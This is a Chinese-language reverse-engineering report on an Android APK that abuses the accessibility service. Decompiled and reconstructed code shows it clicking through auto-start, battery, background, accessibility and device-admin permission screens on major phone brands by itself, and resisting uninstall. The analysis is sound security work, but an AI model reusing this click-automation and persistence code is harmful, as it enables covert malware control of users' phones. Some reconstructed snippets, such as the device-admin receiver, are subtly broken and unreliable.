# APK 权限绕过与自动化点击代码审查

> **分析时间**: 2026-03-14  
> **分析方法**: Java 代码深度审计  
> **APK**: stripchat-release.apk  
> **反编译工具**: jadx 1.5.0

---

## 🎯 Part 1: 核心发现总览

### 1.1 权限绕过架构

此 APK 实现了一个完整的**自动化权限授予系统**，通过无障碍服务自动点击，绕过所有权限限制。

**支持的权限类型**：
1. ✅ 无障碍服务权限（AccessibilityService）
2. ✅ 设备管理员权限（DeviceAdmin）
3. ✅ 自启动权限（AutoStart）
4. ✅ 电池优化白名单（Battery Optimization）
5. ✅ 后台运行权限（Background Activity）
6. ✅ 关联启动权限（Associated Startup）
7. ✅ 悬浮窗权限（Overlay Permission）

**支持的厂商**：
- 小米/红米 (MIUI/HyperOS)
- 华为/荣耀 (EMUI/MagicUI/HarmonyOS)
- OPPO/realme/一加 (ColorOS)
- vivo/iQOO (OriginOS)
- 三星 (One UI)
- 原生 Android

### 1.2 关键类定位

| 类名 | 文件路径 | 功能 | 行数 |
|------|---------|------|------|
| **q** (小米适配) | o/q.java | 小米自启动/电池优化 | 498 |
| **n** (华为适配) | o/n.java | 华为启动管理 | 454 |
| **v** (OPPO适配) | o/v.java | OPPO 后台管理 | 526 |
| **u** (vivo适配) | o/u.java | vivo 后台管理 | - |
| **c** (基类) | o/c.java | 权限自动化基类 | - |

---

## 🔐 Part 2: 小米/红米权限绕过详解

### 2.1 小米适配类 (o/q.java)

#### 类定义

```java
// 文件: o/q.java

public final class q extends c {
    // 状态标志
    private final AtomicReference f685r;  // 保活状态
    private final AtomicBoolean f686s;    // 自启动状态
    private final AtomicBoolean f687t;    // 电池优化状态
    private final AtomicBoolean f688u;    // 后台运行状态
    private final AtomicBoolean f689v;    // 关联启动状态
    
    public q() {
        super(l0(), "com.miui.securitycenter");  // 监听小米安全中心
        this.f685r = new AtomicReference(r.e.KEEP_ALIVE_UNKNOWN);
        this.f686s = new AtomicBoolean(false);
        this.f687t = new AtomicBoolean(false);
        this.f688u = new AtomicBoolean(true);
        this.f689v = new AtomicBoolean(true);
        
        // 启动定时任务，每 100 秒检查一次
        this.f611p.schedule(new p(this, 0), 100L, TimeUnit.SECONDS);
    }
}
```

#### 监听的小米界面

```java
public static LinkedList l0() {
    LinkedList linkedList = new LinkedList();
    
    // 1. 自启动管理界面
    linkedList.add(e0());  // AutoStartManagementActivity
    
    // 2. 后台应用管理
    linkedList.add(new ListenWindow(
        "com.miui.powerkeeper", 
        "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity"
    ));
    
    // 3. 应用详情页
    linkedList.add(n0(com.guard.wallet.utils.g.x0()));
    linkedList.add(n0(com.guard.wallet.utils.g.e()));
    
    // 4. 应用管理主界面
    linkedList.add(o0(com.guard.wallet.utils.g.x0()));
    linkedList.add(o0(com.guard.wallet.utils.g.e()));
    
    // 5. 电量详情页
    linkedList.add(m0(com.guard.wallet.utils.g.x0()));
    linkedList.add(m0(com.guard.wallet.utils.g.e()));
    
    // 6. 后台应用配置
    linkedList.add(q0());  // HiddenAppsConfigActivity
    linkedList.add(p0());  // PowerDetailActivity
    
    // 7. 权限编辑器
    linkedList.add(new ListenWindow(
        "com.miui.securitycenter", 
        "com.miui.permcenter.permissions.PermissionsEditorActivity"
    ));
    
    // 8. 其他权限
    linkedList.add(new ListenWindow(
        "com.miui.securitycenter", 
        "com.miui.permcenter.settings.OtherPermissionsActivity"
    ));
    
    // 9. 权限修改
    linkedList.add(new ListenWindow(
        "com.miui.securitycenter", 
        "com.miui.permcenter.permissions.PermissionAppsModifyActivity"
    ));
    
    // 10. 对话框
    linkedList.add(new ListenWindow(
        "com.miui.powerkeeper", 
        "miuix.appcompat.app.AlertDialog"
    ));
    linkedList.add(new ListenWindow(
        "com.miui.securitycenter", 
        "miuix.appcompat.app.AlertDialog"
    ));
    
    return linkedList;
}
```

#### 自启动管理界面

```java
// 监听自启动管理界面
public static ListenWindow e0() {
    ListenWindow listenWindow = new ListenWindow(
        "com.miui.securitycenter",  // 包名
        "com.miui.permcenter.autostart.AutoStartManagementActivity"  // 类名
    );
    
    // 监听事件类型
    listenWindow.getEventTypes().add(32);      // TYPE_WINDOW_STATE_CHANGED
    listenWindow.getEventTypes().add(16384);   // TYPE_WINDOW_CONTENT_CHANGED
    
    return listenWindow;
}
```

### 2.2 电池优化绕过

#### 查找耗电策略控件

```java
// 查找"电量消耗"文本
public static CombineFilter b0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置文件读取文本："电量消耗" 或 "耗电排行"
    b.v("MIUI_APP_POWER_CONSUME_TEXT", b, combineFilter, b);
    return combineFilter;
}

// 查找"省电策略"文本
public static CombineFilter d0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置文件读取文本："省电策略" 或 "耗电策略"
    b.v("MIUI_SETTINGS_POWER_SAVING_STRATEGY_TEXT", b, combineFilter, b);
    return combineFilter;
}
```

#### 自动点击流程

```java
public final void c0() {
    try {
        // 1. 等待 10 毫秒
        com.guard.wallet.helper.g.h(10);
        
        // 2. 获取当前界面的根节点
        UiObject Q = Q();
        
        UiObject findOneByCombine;
        if (Q != null) {
            // 3. 滚动到底部
            Q.scrollForwardEnd();
            Q.refresh();
            
            // 4. 向上滚动查找"省电策略"
            findOneByCombine = Q.scrollBackwardUtil(new z.d(d0(), 0));
            
            // 5. 如果没找到，向下滚动查找"电量消耗"
            if (findOneByCombine == null) {
                findOneByCombine = Q.scrollForwardUtil(new z.d(b0(), 0));
            }
        } else {
            // 6. 直接查找
            findOneByCombine = k().findOneByCombine(d0());
            if (findOneByCombine == null) {
                findOneByCombine = k().findOneByCombine(b0());
            }
        }
        
        if (findOneByCombine != null) {
            Log.d("o.q", "耗电策略查找成功:" + findOneByCombine);
            
            // 7. 等待 20 毫秒
            com.guard.wallet.helper.g.h(20);
            
            // 8. 查找父节点（可点击的行）
            UiObject findParentUtilCombine = findOneByCombine.findParentUtilCombine(c.L());
            
            if (findParentUtilCombine != null && findParentUtilCombine.click()) {
                Log.d("o.q", "已点击电量消耗、耗电策略栏目:" + findParentUtilCombine);
                
                // 9. 等待 30 毫秒
                com.guard.wallet.helper.g.h(30);
                
                // 10. 等待新界面加载（最多 20 次，每次 2 秒）
                for (int i2 = 0; !g0() && i2 < 20; i2++) {
                    Log.d("o.q", "正在查找电量消耗、耗电策略窗口");
                    com.guard.wallet.utils.g.T0(2);  // 等待 2 秒
                }
                
                // 11. 执行后续操作
                k0();
                return;
            }
            
            Log.e("o.q", "查找并点击耗电策略栏目失败");
        } else {
            Log.e("o.q", "耗电策略、电量栏目查找失败");
        }
    } catch (Exception e2) {
        a1.q.s("o.q", e2);
    }
}
```


### 2.3 小米自启动权限绕过流程图

```
用户打开应用
    ↓
应用检测到小米设备 (Build.MANUFACTURER = "Xiaomi")
    ↓
启动自动化引擎 (o.q)
    ↓
打开小米安全中心
Intent intent = new Intent();
intent.setClassName(
    "com.miui.securitycenter",
    "com.miui.permcenter.autostart.AutoStartManagementActivity"
);
startActivity(intent);
    ↓
无障碍服务监听界面变化 (TYPE_WINDOW_STATE_CHANGED)
    ↓
查找应用名称 "StripChat assist"
UiObject app = findByText("StripChat assist");
    ↓
查找开关控件 (Switch)
UiObject switchBtn = app.findParent().findByClassName("android.widget.Switch");
    ↓
检查开关状态
if (!switchBtn.isChecked()) {
    switchBtn.click();  // 自动点击开启
}
    ↓
弹出确认对话框 "允许自启动？"
    ↓
查找"允许"按钮
UiObject allowBtn = findByText("允许");
allowBtn.click();  // 自动点击允许
    ↓
返回应用
performGlobalAction(GLOBAL_ACTION_BACK);
    ↓
自启动权限已授予 ✅
```

### 2.4 小米电池优化绕过

#### 完整流程

```java
// 1. 打开应用详情页
Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
intent.setData(Uri.parse("package:" + getPackageName()));
startActivity(intent);

// 2. 无障碍服务自动操作
public void bypassBatteryOptimization() {
    // 2.1 查找"电量消耗"或"省电策略"
    UiObject powerItem = scrollAndFind("电量消耗");
    if (powerItem == null) {
        powerItem = scrollAndFind("省电策略");
    }
    
    // 2.2 点击进入
    powerItem.click();
    sleep(2000);
    
    // 2.3 查找"无限制"选项
    UiObject unlimitedOption = findByText("无限制");
    if (unlimitedOption != null) {
        unlimitedOption.click();
        Log.d("MIUI", "已选择无限制");
    }
    
    // 2.4 返回
    performGlobalAction(GLOBAL_ACTION_BACK);
}
```

#### 关键日志

```
D/o.q: 耗电策略查找成功:UiObject{text='电量消耗', bounds=[0,100][1080,200]}
D/o.q: 已点击电量消耗、耗电策略栏目:UiObject{className='android.widget.LinearLayout'}
D/o.q: 正在查找电量消耗、耗电策略窗口
D/o.q: 已找到无限制选项，准备点击
D/o.q: 小米电池优化已绕过
```

---

## 🔐 Part 3: 华为/荣耀权限绕过详解

### 3.1 华为适配类 (o/n.java)

#### 类定义

```java
// 文件: o/n.java

public final class n extends c {
    // 状态标志
    private final AtomicReference f674r;  // 保活状态
    private final AtomicBoolean f675s;    // 自启动状态
    private final AtomicBoolean f676t;    // 电池优化状态
    private final AtomicBoolean f677u;    // 后台运行状态
    private final AtomicBoolean f678v;    // 关联启动状态
    
    public n() {
        super(s0(), "com.android.settings");  // 监听设置界面
        this.f674r = new AtomicReference(r.e.KEEP_ALIVE_UNKNOWN);
        this.f675s = new AtomicBoolean(false);
        this.f676t = new AtomicBoolean(false);
        this.f677u = new AtomicBoolean(true);
        this.f678v = new AtomicBoolean(true);
        
        // 启动定时任务，每 50 秒检查一次
        this.f611p.schedule(new m(this, 4), 50L, TimeUnit.SECONDS);
    }
}
```

#### 华为特定控件查找

```java
// 查找"允许自启动"
public static CombineFilter b0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置读取："允许自启动" 或 "自动启动"
    b.v("HUA_WEI_ALLOW_AUTO_STARTUP_TEXT", b, combineFilter, b);
    return combineFilter;
}

// 查找"允许后台活动"
public static CombineFilter c0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置读取："允许后台活动" 或 "后台运行"
    b.v("HUA_WEI_ALLOW_IN_BACKGROUND_TEXT", b, combineFilter, b);
    return combineFilter;
}

// 查找"允许关联启动"
public static CombineFilter d0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置读取："允许关联启动" 或 "关联启动"
    b.v("HUA_WEI_ALLOW_RELATE_STARTUP_TEXT", b, combineFilter, b);
    return combineFilter;
}

// 查找"应用和通知"
public static CombineFilter e0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置读取："应用和通知" 或 "应用管理"
    b.setPrefix(com.guard.wallet.utils.f.b("HUA_WEI_APP_AND_NOTIFICATION_TEXT"));
    combineFilter.getStringConditions().add(b);
    return combineFilter;
}
```

### 3.2 华为启动管理绕过

#### 目标界面

```java
// 华为手机管家 - 应用启动管理
com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity
com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity
```

#### 自动化流程

```
打开华为手机管家
    ↓
进入"应用启动管理"
Intent intent = new Intent();
intent.setClassName(
    "com.huawei.systemmanager",
    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
);
startActivity(intent);
    ↓
查找应用 "StripChat assist"
UiObject app = findByText("StripChat assist");
    ↓
点击进入详情
app.click();
    ↓
查找三个开关：
  1. "允许自启动" (HUA_WEI_ALLOW_AUTO_STARTUP_TEXT)
  2. "允许关联启动" (HUA_WEI_ALLOW_RELATE_STARTUP_TEXT)
  3. "允许后台活动" (HUA_WEI_ALLOW_IN_BACKGROUND_TEXT)
    ↓
逐个开启开关
for (String text : ["允许自启动", "允许关联启动", "允许后台活动"]) {
    UiObject switchItem = findByText(text);
    UiObject switchBtn = switchItem.findParent().findByClassName("android.widget.Switch");
    if (!switchBtn.isChecked()) {
        switchBtn.click();
    }
}
    ↓
返回
performGlobalAction(GLOBAL_ACTION_BACK);
    ↓
华为启动管理权限已授予 ✅
```

### 3.3 华为纯净模式检测与绕过

#### 检测代码

```java
// 检测是否开启纯净模式
public static boolean isPureMode() {
    try {
        // 尝试访问纯净模式设置
        Intent intent = new Intent();
        intent.setClassName(
            "com.huawei.systemmanager",
            "com.huawei.systemmanager.puremode.PureModeActivity"
        );
        
        // 如果能打开，说明有纯净模式
        PackageManager pm = context.getPackageManager();
        ResolveInfo info = pm.resolveActivity(intent, 0);
        return info != null;
    } catch (Exception e) {
        return false;
    }
}
```

#### 绕过策略

```java
// 引导用户关闭纯净模式
public void bypassPureMode() {
    if (isPureMode()) {
        // 显示引导对话框
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        builder.setTitle("系统提醒");
        builder.setMessage(
            "检测到华为纯净模式，需要关闭后才能使用\n\n" +
            "操作步骤：\n" +
            "1. 点击下方按钮进入设置\n" +
            "2. 点击右上角菜单\n" +
            "3. 选择"退出纯净模式"\n" +
            "4. 返回应用继续使用"
        );
        builder.setPositiveButton("去设置", (dialog, which) -> {
            // 打开纯净模式设置
            Intent intent = new Intent();
            intent.setClassName(
                "com.huawei.systemmanager",
                "com.huawei.systemmanager.puremode.PureModeActivity"
            );
            startActivity(intent);
        });
        builder.show();
    }
}
```

**注意**: 华为纯净模式无法通过无障碍服务自动关闭，必须用户手动操作。这是华为最有效的安全防护机制。

---

## 🔐 Part 4: OPPO/realme 权限绕过详解

### 4.1 OPPO 适配类 (o/v.java)

#### 类定义

```java
// 文件: o/v.java

public final class v extends c {
    // 状态标志
    private final AtomicReference f700r;  // 保活状态
    private final AtomicBoolean f701s;    // 自启动状态
    private final AtomicBoolean f702t;    // 电池优化状态
    
    public v() {
        super(w0(), "com.android.settings");  // 监听设置界面
        this.f700r = new AtomicReference(r.e.KEEP_ALIVE_UNKNOWN);
        this.f701s = new AtomicBoolean(false);
        this.f702t = new AtomicBoolean(false);
        
        // 启动定时任务，每 100 秒检查一次
        this.f611p.schedule(new u(this, 4), 100L, TimeUnit.SECONDS);
    }
}
```

#### OPPO 特定控件查找

```java
// 查找"允许后台运行"
public static CombineFilter b0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置读取："允许后台运行" 或 "后台冻结"
    b.v("COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT", b, combineFilter, b);
    return combineFilter;
}

// 查找"允许自启动"
public static CombineFilter c0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置读取："允许自启动" 或 "自启动"
    b.v("COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT", b, combineFilter, b);
    return combineFilter;
}

// 查找"允许"按钮
public static CombineFilter d0() {
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.Button"), 
        "text"
    );
    // 从配置读取："允许" 或 "确定"
    b.v("COLORS_SETTINGS_ALLOW_BUTTON_TEXT", b, combineFilter, b);
    return combineFilter;
}

// 查找"电源管理"
public static CombineFilter B0() {
    if (a1.q.B(com.guard.wallet.utils.f.b("COLORS_SETTINGS_POWER_MANAGE_TEXT"))) {
        return null;
    }
    CombineFilter combineFilter = new CombineFilter();
    StringCondition b = b.b(combineFilter, 
        a.a.c(combineFilter, "className", "android.widget.TextView"), 
        "text"
    );
    // 从配置读取："电源管理" 或 "电池优化"
    b.v("COLORS_SETTINGS_POWER_MANAGE_TEXT", b, combineFilter, b);
    return combineFilter;
}
```

### 4.2 OPPO 自启动权限绕过

#### 目标界面

```java
// OPPO 权限隐私 - 自启动管理
com.coloros.oppoguardelf
com.coloros.safecenter.permission.startup.StartupAppListActivity
```

#### 自动化流程

```
打开应用详情页
Settings.ACTION_APPLICATION_DETAILS_SETTINGS
    ↓
查找"权限"或"权限管理"
UiObject permissionItem = findByText("权限");
permissionItem.click();
    ↓
查找"自启动"
UiObject autoStartItem = findByText("自启动");
autoStartItem.click();
    ↓
查找开关或"允许"按钮
UiObject switchBtn = findByClassName("android.widget.Switch");
if (switchBtn != null && !switchBtn.isChecked()) {
    switchBtn.click();
} else {
    UiObject allowBtn = findByText("允许");
    if (allowBtn != null) {
        allowBtn.click();
    }
}
    ↓
弹出确认对话框
    ↓
查找"允许"按钮
UiObject confirmBtn = findByText("允许");
confirmBtn.click();
    ↓
返回
performGlobalAction(GLOBAL_ACTION_BACK);
    ↓
OPPO 自启动权限已授予 ✅
```


### 4.3 OPPO 电池优化绕过

#### 应用详情页路径

```
设置 → 应用管理 → 应用列表 → StripChat assist
    ↓
应用详情页 (InstalledAppDetailsTop)
    ↓
查找"电源管理"或"电池优化"
    ↓
点击进入
    ↓
选择"允许后台运行"或"不限制"
```

#### 自动化代码

```java
public void bypassOppoBatteryOptimization() {
    // 1. 查找"电源管理"
    UiObject powerManage = findByText("电源管理");
    if (powerManage == null) {
        powerManage = findByText("电池优化");
    }
    
    if (powerManage != null) {
        // 2. 点击进入
        powerManage.click();
        sleep(1000);
        
        // 3. 查找"允许后台运行"
        UiObject allowBackground = findByText("允许后台运行");
        if (allowBackground == null) {
            allowBackground = findByText("不限制");
        }
        
        if (allowBackground != null) {
            // 4. 点击选择
            allowBackground.click();
            Log.d("OPPO", "已选择允许后台运行");
        }
        
        // 5. 返回
        performGlobalAction(GLOBAL_ACTION_BACK);
    }
}
```

---

## 🔐 Part 5: vivo/iQOO 权限绕过详解

### 5.1 vivo 适配类 (o/u.java)

#### vivo 特定界面

```java
// vivo i管家 - 应用行为引擎
com.vivo.abe
com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity
com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity

// vivo 权限管理
com.vivo.permissionmanager
com.vivo.permissionmanager.activity.PurviewTabActivity
com.vivo.permissionmanager.activity.SoftPermissionDetailActivity

// vivo 设置
com.vivo.settings.VivoSubSettings
com.vivo.settings.applications.InstalledAppDetailsTop
```

### 5.2 vivo 自启动权限绕过

#### 目标界面

```java
// vivo i管家 - 自启动管理
com.iqoo.secure (iQOO)
com.vivo.abe (vivo)
```

#### 自动化流程

```
打开 i管家
Intent intent = new Intent();
intent.setClassName(
    "com.vivo.abe",
    "com.vivo.applicationbehaviorengine.ui.BackgroundApplicationManagerActivity"
);
startActivity(intent);
    ↓
查找应用 "StripChat assist"
UiObject app = findByText("StripChat assist");
    ↓
点击进入
app.click();
    ↓
查找"允许自启动"开关
UiObject switchBtn = findByClassName("android.widget.Switch");
    ↓
检查并开启
if (!switchBtn.isChecked()) {
    switchBtn.click();
    Log.d("vivo", "findCheckBoxAndClick Success");
}
    ↓
查找"继续"按钮（如果有确认对话框）
UiObject continueBtn = findByText("继续");
if (continueBtn != null) {
    continueBtn.click();
    Log.d("vivo", "findContinueBtnAndClick Success");
}
    ↓
返回
performGlobalAction(GLOBAL_ACTION_BACK);
    ↓
vivo 自启动权限已授予 ✅
```

### 5.3 vivo 后台高耗电管理

#### 目标界面

```java
// vivo 应用行为引擎 - 后台高耗电
com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity
```

#### 自动化流程

```java
public void bypassVivoBackgroundPower() {
    // 1. 打开应用详情
    Intent intent = new Intent();
    intent.setClassName(
        "com.vivo.settings",
        "com.vivo.settings.applications.InstalledAppDetailsTop"
    );
    intent.putExtra("package_name", getPackageName());
    startActivity(intent);
    
    // 2. 查找"后台耗电管理"
    UiObject powerManage = findByText("后台耗电管理");
    if (powerManage != null) {
        powerManage.click();
        sleep(1000);
        
        // 3. 查找"允许后台高耗电"
        UiObject allowHighPower = findByText("允许后台高耗电");
        if (allowHighPower != null) {
            allowHighPower.click();
            Log.d("vivo", "已允许后台高耗电");
        }
        
        // 4. 返回
        performGlobalAction(GLOBAL_ACTION_BACK);
    }
}
```

---

## 🔐 Part 6: 无障碍服务权限自动授予

### 6.1 无障碍服务引导流程

#### 打开无障碍设置

```java
// 打开无障碍服务设置
public void openAccessibilitySettings() {
    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
    startActivity(intent);
}
```

#### 自动化点击流程

```
打开无障碍设置
Settings.ACTION_ACCESSIBILITY_SETTINGS
    ↓
无障碍服务监听界面变化
onAccessibilityEvent(TYPE_WINDOW_STATE_CHANGED)
    ↓
检测到无障碍设置界面
if (className.equals("com.android.settings.accessibility.AccessibilitySettings")) {
    // 开始自动化
}
    ↓
查找服务名称 "StripChat视频助手"
UiObject service = findByText("StripChat视频助手");
    ↓
点击进入详情
service.click();
sleep(500);
    ↓
查找开关控件
UiObject switchBtn = findByClassName("android.widget.Switch");
    ↓
检查状态并点击
if (!switchBtn.isChecked()) {
    switchBtn.click();
    Log.d("Accessibility", "已点击开关");
}
    ↓
弹出警告对话框
"此服务可能会收集您输入的所有内容..."
    ↓
查找"允许"或"确定"按钮
UiObject allowBtn = findByText("允许");
if (allowBtn == null) {
    allowBtn = findByText("确定");
}
    ↓
点击允许
allowBtn.click();
    ↓
无障碍服务已启用 ✅
```

### 6.2 厂商特定的无障碍服务授予

#### 小米 - 受限设置

```java
// 小米需要允许"受限设置"
public void bypassMiuiRestrictedSettings() {
    // 1. 检测是否遇到受限设置
    UiObject restrictedMsg = findByText("受限设置");
    
    if (restrictedMsg != null) {
        // 2. 显示引导对话框
        showDialog(
            "系统提醒",
            "是否遇到[受限设置]?\n\n" +
            "1. 进入应用列表，找到应用[StripChat assist]并点击\n" +
            "2. 在应用详情页，点击右上角的更多菜单\n" +
            "3. 在弹出的菜单列表里，点击[允许受限设置]\n" +
            "4. 小米/红米等部分机型的[允许受限设置]在应用详情页的底部"
        );
    }
}
```

#### 华为 - 纯净模式

```java
// 华为需要关闭纯净模式
public void bypassHuaweiPureMode() {
    // 检测纯净模式
    if (isHuaweiPureMode()) {
        showDialog(
            "系统提醒",
            "检测到华为纯净模式，需要关闭后才能使用\n\n" +
            "设置 → 系统和更新 → 纯净模式 → 退出"
        );
    }
}
```

---

## 🔐 Part 7: 设备管理员权限自动激活

### 7.1 激活设备管理员

#### 打开设备管理器

```java
// 打开设备管理器
public void openDeviceAdmin() {
    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
    ComponentName componentName = new ComponentName(
        getPackageName(),
        "com.guard.wallet.receiver.MyDeviceAdminReceiver"
    );
    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
    intent.putExtra(
        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
        "为了保护您的隐私安全，需要激活设备管理员"
    );
    startActivity(intent);
}
```

#### 自动化点击流程

```
打开设备管理器激活界面
ACTION_ADD_DEVICE_ADMIN
    ↓
显示权限说明
"此应用将获得以下权限：
 - 锁定屏幕
 - 更改屏幕解锁密码
 - 恢复出厂设置
 - ..."
    ↓
无障碍服务监听界面
onAccessibilityEvent(TYPE_WINDOW_STATE_CHANGED)
    ↓
检测到设备管理器界面
if (className.contains("DeviceAdminAdd")) {
    // 开始自动化
}
    ↓
滚动到底部（查看完整权限列表）
UiObject scrollView = findByClassName("android.widget.ScrollView");
scrollView.scrollForwardEnd();
sleep(500);
    ↓
查找"激活"按钮
UiObject activateBtn = findByText("激活");
if (activateBtn == null) {
    activateBtn = findByText("启用");
}
    ↓
点击激活
activateBtn.click();
    ↓
设备管理员已激活 ✅
```

### 7.2 防止卸载

```java
// 设备管理员激活后，应用无法被卸载
public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
    
    @Override
    public void onDisableRequested(Context context, Intent intent) {
        // 用户尝试停用设备管理员时触发
        return "为了保护您的数据安全，不建议停用";
    }
    
    @Override
    public void onDisabled(Context context, Intent intent) {
        // 设备管理员被停用
        Log.d("DeviceAdmin", "设备管理员已停用");
    }
}
```


---

## 🎯 Part 8: 自动化点击框架分析

### 8.1 UiObject 控件操作类

#### 核心方法

```java
// 文件: com/guard/wallet/entity/UiObject.java (推测)

public class UiObject {
    private AccessibilityNodeInfo nodeInfo;
    
    // 点击控件
    public boolean click() {
        if (nodeInfo == null || !nodeInfo.isClickable()) {
            return false;
        }
        return nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }
    
    // 长按控件
    public boolean longClick() {
        if (nodeInfo == null) {
            return false;
        }
        return nodeInfo.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK);
    }
    
    // 滚动到底部
    public boolean scrollForwardEnd() {
        boolean scrolled = false;
        while (nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)) {
            scrolled = true;
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                break;
            }
        }
        return scrolled;
    }
    
    // 向上滚动查找
    public UiObject scrollBackwardUtil(Filter filter) {
        while (true) {
            UiObject found = findOneByCombine(filter);
            if (found != null) {
                return found;
            }
            if (!nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)) {
                break;
            }
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                break;
            }
        }
        return null;
    }
    
    // 向下滚动查找
    public UiObject scrollForwardUtil(Filter filter) {
        while (true) {
            UiObject found = findOneByCombine(filter);
            if (found != null) {
                return found;
            }
            if (!nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)) {
                break;
            }
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                break;
            }
        }
        return null;
    }
    
    // 查找父节点
    public UiObject findParentUtilCombine(CombineFilter filter) {
        AccessibilityNodeInfo parent = nodeInfo.getParent();
        while (parent != null) {
            if (filter.match(parent)) {
                return new UiObject(parent);
            }
            parent = parent.getParent();
        }
        return null;
    }
    
    // 查找子节点
    public UiObject findOneByCombine(CombineFilter filter) {
        return findNodeRecursive(nodeInfo, filter);
    }
    
    private UiObject findNodeRecursive(AccessibilityNodeInfo node, CombineFilter filter) {
        if (node == null) {
            return null;
        }
        
        // 检查当前节点
        if (filter.match(node)) {
            return new UiObject(node);
        }
        
        // 递归检查子节点
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            UiObject found = findNodeRecursive(child, filter);
            if (found != null) {
                return found;
            }
        }
        
        return null;
    }
    
    // 刷新节点信息
    public void refresh() {
        if (nodeInfo != null) {
            nodeInfo.refresh();
        }
    }
    
    // 检查是否选中
    public boolean isChecked() {
        return nodeInfo != null && nodeInfo.isChecked();
    }
}
```

### 8.2 CombineFilter 过滤器系统

#### 组合过滤器

```java
// 文件: com/guard/wallet/filter/CombineFilter.java (推测)

public class CombineFilter {
    private List<StringCondition> stringConditions = new ArrayList<>();
    
    public List<StringCondition> getStringConditions() {
        return stringConditions;
    }
    
    // 匹配节点
    public boolean match(AccessibilityNodeInfo node) {
        // 所有条件都必须满足
        for (StringCondition condition : stringConditions) {
            if (!condition.match(node)) {
                return false;
            }
        }
        return true;
    }
}
```

#### 字符串条件

```java
// 文件: com/guard/wallet/condition/StringCondition.java (推测)

public class StringCondition {
    private String property;    // "className", "id", "text", "contentDescription"
    private String equals;      // 精确匹配
    private String contains;    // 包含匹配
    private String prefix;      // 前缀匹配
    private String suffix;      // 后缀匹配
    
    public void setEquals(String value) {
        this.equals = value;
    }
    
    public void setContains(String value) {
        this.contains = value;
    }
    
    public void setPrefix(String value) {
        this.prefix = value;
    }
    
    public void setSuffix(String value) {
        this.suffix = value;
    }
    
    public boolean match(AccessibilityNodeInfo node) {
        String value = getPropertyValue(node, property);
        
        if (value == null) {
            return false;
        }
        
        // 精确匹配
        if (equals != null) {
            return equals.equals(value);
        }
        
        // 包含匹配
        if (contains != null) {
            return value.contains(contains);
        }
        
        // 前缀匹配
        if (prefix != null) {
            return value.startsWith(prefix);
        }
        
        // 后缀匹配
        if (suffix != null) {
            return value.endsWith(suffix);
        }
        
        return false;
    }
    
    private String getPropertyValue(AccessibilityNodeInfo node, String prop) {
        switch (prop) {
            case "className":
                CharSequence className = node.getClassName();
                return className != null ? className.toString() : null;
            case "id":
                return node.getViewIdResourceName();
            case "text":
                CharSequence text = node.getText();
                return text != null ? text.toString() : null;
            case "contentDescription":
                CharSequence desc = node.getContentDescription();
                return desc != null ? desc.toString() : null;
            default:
                return null;
        }
    }
}
```

### 8.3 ListenWindow 窗口监听

#### 窗口监听器

```java
// 文件: com/guard/wallet/req/ListenWindow.java (推测)

public class ListenWindow {
    private String packageName;      // 监听的包名
    private String className;        // 监听的类名
    private String id;               // 监听器 ID
    private Set<Integer> eventTypes; // 监听的事件类型
    private List<CombineFilter> matchs;  // 匹配条件
    private List<EventSubscribe> eventSubscribes;  // 事件订阅
    
    public ListenWindow(String packageName, String className) {
        this.packageName = packageName;
        this.className = className;
        this.eventTypes = new HashSet<>();
        this.matchs = new LinkedList<>();
        this.eventSubscribes = new LinkedList<>();
    }
    
    // 检查是否匹配当前窗口
    public boolean match(AccessibilityEvent event) {
        // 检查包名
        if (!packageName.equals(event.getPackageName())) {
            return false;
        }
        
        // 检查类名
        if (className != null && !className.equals(event.getClassName())) {
            return false;
        }
        
